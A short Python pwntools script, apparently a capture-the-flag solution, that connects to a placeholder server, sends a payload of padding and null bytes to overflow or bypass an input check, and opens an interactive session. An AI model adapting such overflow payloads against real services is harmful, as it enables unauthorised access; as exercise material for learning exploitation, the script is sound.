import pwn

r = pwn.remote('<server>',<port>);
payload = 'A'*20 + '\x00' + 'A'*31 + '\x00'

r.sendline(payload)
r.interactive()
